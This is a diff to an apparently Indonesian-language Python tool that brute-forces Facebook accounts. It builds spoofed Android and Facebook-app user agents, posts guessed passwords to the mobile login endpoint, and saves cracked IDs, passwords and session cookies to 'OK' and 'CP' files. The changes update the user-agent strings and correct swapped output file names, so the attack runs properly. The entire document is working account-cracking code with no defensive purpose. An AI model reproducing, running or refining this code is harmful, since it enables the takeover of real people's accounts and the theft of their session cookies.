@@ -16,25 +16,25 @@ ok,cp,oo = 0,0,[]
 for agenku in range(10000):
 	a='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['8.1.0','9','10','11','12','13'])
-	c='SAMSUNG SM-E5260)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	c='ASUS_A009 Build/OPM1.171019.011; wv)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
 	e=random.randrange(73,100)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/537.36'
+	i='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/293.0.0.9.114;]'
 	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 	usragent.append(uakuh)
 	
 	a='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['8.1.0','9','10','11','12','13'])
-	c='Redmi Note 9 Pro)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	c='TECNO LB7 Build/O11019; wv)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
 	e=random.randrange(73,100)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/537.36'
+	i='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/288.0.0.11.115;]'
 	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 	usragent.append(uakuh)
 
@@ -231,7 +231,6 @@ def wordlist():
 					gas_krek.submit(crackmbasic,idf,pwv)
 				else:
 					gas_krek.submit(crackmbasic,idf,pwv)
-		print('')
 		print(f'{xxx}─────────────────────────────')
 		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
 		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
@@ -255,7 +254,7 @@ def crackmobile(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')     
-				open('CP/'+okh,'a').write(idf+'|'+pw+'\n')
+				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -263,7 +262,7 @@ def crackmobile(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r└── {hijo}{idf}|{pw}\n{xxx}└── {hijo}{kuki}{xxx}')
-				open('OK/'+cph,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
@@ -290,7 +289,7 @@ def crackfree(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')     
-				open('CP/'+okh,'a').write(idf+'|'+pw+'\n')
+				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -298,7 +297,7 @@ def crackfree(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r└── {hijo}{idf}|{pw}\n{xxx}└── {hijo}{kuki}{xxx}')
-				open('OK/'+cph,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
@@ -325,7 +324,7 @@ def crackmbasic(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')     
-				open('CP/'+okh,'a').write(idf+'|'+pw+'\n')
+				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -333,7 +332,7 @@ def crackmbasic(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r└── {hijo}{idf}|{pw}\n{xxx}└── {hijo}{kuki}{xxx}')
-				open('OK/'+cph,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
